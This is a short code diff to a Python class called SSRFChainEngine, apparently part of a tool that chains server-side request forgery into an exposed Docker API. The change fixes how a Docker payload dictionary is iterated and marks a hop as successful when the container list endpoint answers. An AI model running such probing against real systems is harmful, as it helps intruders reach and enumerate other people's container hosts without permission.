@@ -281,7 +281,7 @@ class SSRFChainEngine:
         target = "%s:%d" % (host, port)
         chain_path = []
 
-        for path, desc in DOCKER_PAYLOADS.items():
+        for name, path in DOCKER_PAYLOADS.items():
             if "%s" in path:
                 continue
             docker_url = "http://%s:%d%s" % (host, port, path)
@@ -291,8 +291,8 @@ class SSRFChainEngine:
                 if r.status_code == 200:
                     try:
                         data = r.json()
-                        chain_path.append("docker_%s" % path.strip("/"))
-                        if path == "/containers/json" and isinstance(data, list):
+                        chain_path.append("docker_%s" % name)
+                        if name == "containers" and isinstance(data, list):
                             return HopResult(
                                 hop=1, protocol="docker", target=target, port=port,
                                 success=True, response_preview=str(data)[:300],
